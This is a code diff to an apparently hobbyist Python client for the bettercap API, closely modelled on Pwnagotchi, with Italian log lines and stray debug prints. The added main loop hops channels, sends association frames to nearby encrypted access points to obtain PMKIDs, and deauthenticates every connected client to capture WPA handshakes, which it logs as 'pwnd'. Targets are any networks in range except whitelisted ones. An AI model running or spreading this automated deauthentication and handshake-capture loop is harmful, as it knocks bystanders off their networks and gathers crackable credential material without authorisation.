@@ -16,6 +16,7 @@ logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s [%(levelname)s] %(message)s',
 )
+
 requests.adapters.DEFAULT_RETRIES = 5
 
 ping_timeout = 180
@@ -50,6 +51,11 @@ class Client:
         self.url = f"{scheme}://{hostname}:{port}/api"
         self.websocket = f"ws://{username}:{password}@{hostname}:{port}/api"
         self.auth = HTTPBasicAuth(username, password)
+
+        self._history = {}
+        self._handshakes={}
+
+ 
 
     def session(self, sess="session"):
         r = requests.get(f"{self.url}/{sess}", auth=self.auth)
@@ -101,6 +107,18 @@ class Client:
                 break
         return decode(r, verbose_errors=verbose_errors)
 
+    def setup_events(self):
+        logging.info("connecting to %s ...", self.url)
+
+        for tag in self.config['bettercap']['silence']:
+            try:
+                print("QUI")
+                print(self.config)
+                sleep(10)
+                self.run('events.ignore %s' % tag, verbose_errors=False)
+            except Exception:
+                pass
+
     def start_module(self, module):
         self.run(f'{module} on')
 
@@ -137,9 +155,12 @@ class Client:
         self.run(f'set wifi.rssi.min {cfg["personality"]["min_rssi"]}')
         self.run(f'set wifi.handshakes.file {cfg["bettercap"]["handshakes"]}')
         self.run('set wifi.handshakes.aggregate false')
+        
 
     def start_monitor_mode(self):
-        mon_iface = "wlan0mon"
+        cfg = self.get_config()
+
+        mon_iface = cfg["main"]['iface']
         mon_start_cmd = "startmon.sh"
         has_mon = False
 
@@ -173,7 +194,54 @@ class Client:
         else:
             logging.debug("starting wifi module ...")
             self.start_module('wifi.recon')
+    
+    async def _on_event(self, msg):
+        found_handshake = False
+        jmsg = json.loads(msg)
 
+        # give plugins access to the events
+        try:
+            plugins.on('bcap_%s' % re.sub(r"[^a-z0-9_]+", "_", jmsg['tag'].lower()), self, jmsg)
+        except Exception as err:
+            logging.error("Processing event: %s" % err)
+
+        if jmsg['tag'] == 'wifi.client.handshake':
+            filename = jmsg['data']['file']
+            sta_mac = jmsg['data']['station']
+            ap_mac = jmsg['data']['ap']
+            key = "%s -> %s" % (sta_mac, ap_mac)
+            if key not in self._handshakes:
+                self._handshakes[key] = jmsg
+                s = self.session()
+                ap_and_station = self._find_ap_sta_in(sta_mac, ap_mac, s)
+                if ap_and_station is None:
+                    logging.warning("!!! captured new handshake: %s !!!", key)
+                    self._last_pwnd = ap_mac
+                    plugins.on('handshake', self, filename, ap_mac, sta_mac)
+                else:
+                    (ap, sta) = ap_and_station
+                    self._last_pwnd = ap['hostname'] if ap['hostname'] != '' and ap[
+                        'hostname'] != '<hidden>' else ap_mac
+                    logging.warning(
+                        "!!! captured new handshake on channel %d, %d dBm: %s (%s) -> %s [%s (%s)] !!!",
+                        ap['channel'], ap['rssi'], sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'])
+                    #plugins.on('handshake', self, filename, ap, sta)
+                found_handshake = True
+            self._update_handshakes(1 if found_handshake else 0)
+
+
+    def _event_poller(self, loop):
+        self._load_recovery_data()
+        self.run('events.clear')
+
+        while True:
+            logging.debug("[agent:_event_poller] polling events ...")
+            try:
+                loop.create_task(start_websocket(self._on_event))
+                loop.run_forever()
+                logging.debug("[agent:_event_poller] loop loop loop")
+            except Exception as ex:
+                logging.debug("[agent:_event_poller] Error while polling via websocket (%s)", ex)
     def start_event_polling(self):
         threading.Thread(
             target=self._event_poller,
@@ -198,6 +266,157 @@ class Client:
             except Exception as e:
                 logging.exception("Error setting wifi.recon.channels: %s", e)
 
+    def _has_handshake(self, bssid):
+        for key in self._handshakes:
+            if bssid.lower() in key:
+                return True
+        return False
+
+    def _should_interact(self, who):
+        if self._has_handshake(who):
+            return False
+
+        elif who not in self._history:
+            self._history[who] = 1
+            return True
+
+        else:
+            self._history[who] += 1
+
+        return self._history[who] < self.config['personality']['max_interactions']
+
+    def set_access_points(self, aps):
+        self._access_points = aps
+        #plugins.on('wifi_update', self, aps)
+        #self._epoch.observe(aps, list(self._peers.values()))
+        return self._access_points
+
+
+    def get_access_points(self):
+        whitelist = self.config['main']['whitelist']
+        aps = []
+        try:
+            s = self.session()
+            #plugins.on("unfiltered_ap_list", self, s['wifi']['aps'])
+            for ap in s['wifi']['aps']:
+                if ap['encryption'] == '' or ap['encryption'] == 'OPEN':
+                    continue
+                elif ap['hostname'] in whitelist or ap['mac'][:13].lower() in whitelist or ap['mac'].lower() in whitelist:
+                    continue
+                else:
+                    aps.append(ap)
+        except Exception as e:
+            logging.exception("Error while getting access points (%s)", e)
+
+        aps.sort(key=lambda ap: ap['channel'])
+        return self.set_access_points(aps)
+
+    def get_access_points_by_channel(self):
+        aps = self.get_access_points()
+        logging.info(aps)
+        channels = self.config['personality']['channels']
+        grouped = {}
+
+        # group by channel
+        for ap in aps:
+            ch = ap['channel']
+            # if we're sticking to a channel, skip anything
+            # which is not on that channel
+            if channels and ch not in channels:
+                continue
+
+            if ch not in grouped:
+                grouped[ch] = [ap]
+            else:
+                grouped[ch].append(ap)
+
+        # sort by more populated channels
+        return sorted(grouped.items(), key=lambda kv: len(kv[1]), reverse=True)
+
+    def set_channel(self, channel, verbose=True):
+           # if self.is_stale():
+           #     logging.debug("recon is stale, skipping set_channel(%d)", channel)
+           #     return
+
+            # if in the previous loop no client stations has been deauthenticated
+            # and only association frames have been sent, we don't need to wait
+            # very long before switching channel as we don't have to wait for
+            # such client stations to reconnect in order to sniff the handshake.
+            wait = 0
+            #if self._epoch.did_deauth:
+            #    wait = self.config['personality']['hop_recon_time']
+            #elif self._epoch.did_associate:
+            #    wait = self.config['personality']['min_recon_time']
+
+            if channel != self._current_channel:
+                if self._current_channel != 0 and wait > 0:
+                    if verbose:
+                        logging.info("waiting for %ds on channel %d ...", wait, self._current_channel)
+                    else:
+                        logging.debug("waiting for %ds on channel %d ...", wait, self._current_channel)
+                    self.wait_for(wait)
+                #if verbose and self._epoch.any_activity:
+                #    logging.info("CHANNEL %d", channel)
+                try:
+                    self.run('wifi.recon.channel %d' % channel)
+                    self._current_channel = channel
+                    #self._epoch.track(hop=True)
+                    #self._view.set('channel', '%d' % channel)
+
+                    #plugins.on('channel_hop', self, channel)
+
+                except Exception as e:
+                    logging.error("Error while setting channel (%s)", e)
+
+    def associate(self, ap, throttle=-1):
+       # if self.is_stale():
+        #    logging.debug("recon is stale, skipping assoc(%s)", ap['mac'])
+        #    return
+        if throttle == -1 and "throttle_a" in self.config['personality']:
+            throttle = self.config['personality']['throttle_a']
+
+        if self.config['personality']['associate'] and self._should_interact(ap['mac']):
+            #self._view.on_assoc(ap)
+
+            try:
+                logging.info("sending association frame to %s (%s %s) on channel %d [%d clients], %d dBm...",
+                             ap['hostname'], ap['mac'], ap['vendor'], ap['channel'], len(ap['clients']), ap['rssi'])
+                self.run('wifi.assoc %s' % ap['mac'])
+               # self._epoch.track(assoc=True)
+            except Exception as e:
+                self._on_error(ap['mac'], e)
+
+            #plugins.on('association', self, ap)
+            if throttle > 0:
+                time.sleep(throttle)
+            #self._view.on_normal()
+
+    def deauth(self, ap, sta, throttle=-1):
+        #if self.is_stale():
+        #    logging.debug("recon is stale, skipping deauth(%s)", sta['mac'])
+        #    return
+
+        if throttle == -1 and "throttle_d" in self.config['personality']:
+            throttle = self.config['personality']['throttle_d']
+
+        if self.config['personality']['deauth'] and self._should_interact(sta['mac']):
+            #self._view.on_deauth(sta)
+
+            try:
+                logging.info("deauthing %s (%s) from %s (%s %s) on channel %d, %d dBm ...",
+                             sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'], ap['channel'],
+                             ap['rssi'])
+                self.run('wifi.deauth %s' % sta['mac'])
+                #self._epoch.track(deauth=True)
+            except Exception as e:
+                self._on_error(sta['mac'], e)
+
+            #plugins.on('deauthentication', self, ap, sta)
+            if throttle > 0:
+                time.sleep(throttle)
+            #self._view.on_normal()
+
+
 
 def load_toml_file(filename):
     with open(filename) as fp:
@@ -219,6 +438,8 @@ def load_toml_file(filename):
         return data
 
 
+
+
 def start(args):
     config = load_toml_file(args.config)
     logging.info("Loaded config: %s", config)
@@ -231,24 +452,19 @@ def start(args):
                         "pwnagotchi" if "username" not in config['bettercap'] else config['bettercap']['username'],
                         "pwnagotchi" if "password" not in config['bettercap'] else config['bettercap']['password'])
 
-
+    client.setup_events()
     logging.info("Client è di tipo: %s", type(client))
+    #client.run("set events.stream false")
+    #client.run("set events.logger false")
 
     client.session()
 
-    logging.info("Client è di tipo: %s", type(client))
-
-
+  
     client.start_monitor_mode()
 
     logging.info("Client è di tipo: %s", type(client))
 
-
-    client.recon()
-
-    logging.info("Client è di tipo: %s", type(client))
-
-
+    """
     while True:
         session = client.session("session/wifi")
 
@@ -267,3 +483,50 @@ def start(args):
                 print(f"    [Client] MAC: {mac}, RSSI: {rssi}")
 
         time.sleep(5)
+    """
+
+    while True:
+            try:
+                # recon on all channels
+                client.recon()
+                # get nearby access points grouped by channel
+                channels = client.get_access_points_by_channel()
+
+
+                # for each channel
+                for ch, aps in channels:
+                    time.sleep(1)
+                    client.set_channel(ch)
+
+                    #if not agent.is_stale() and agent.any_activity():
+                    logging.info("%d access points on channel %d" % (len(aps), ch))
+
+                    # for each ap on this channel
+                    for ap in aps:
+                        # send an association frame in order to get for a PMKID
+                        client.associate(ap)
+                        # deauth all client stations in order to get a full handshake
+                        for sta in ap['clients']:
+                            client.deauth(ap, sta)
+                            time.sleep(1)  # delay to not trigger nexmon firmware bugs
+
+                # An interesting effect of this:
+                #
+                # From Pwnagotchi's perspective, the more new access points
+                # and / or client stations nearby, the longer one epoch of
+                # its relative time will take ... basically, in Pwnagotchi's universe,
+                # Wi-Fi electromagnetic fields affect time like gravitational fields
+                # affect ours ... neat ^_^
+                #agent.next_epoch()
+
+                #if grid.is_connected():
+                 #   plugins.on('internet_available', agent)
+
+            except Exception as e:
+                if str(e).find("wifi.interface not set") > 0:
+                    logging.exception("main loop exception due to unavailable wifi device, likely programmatically disabled (%s)", e)
+                    logging.info("sleeping 60 seconds then advancing to next epoch to allow for cleanup code to trigger")
+                    time.sleep(60)
+                    #agent.next_epoch()
+                else:
+                    logging.exception("main loop exception (%s)", e)
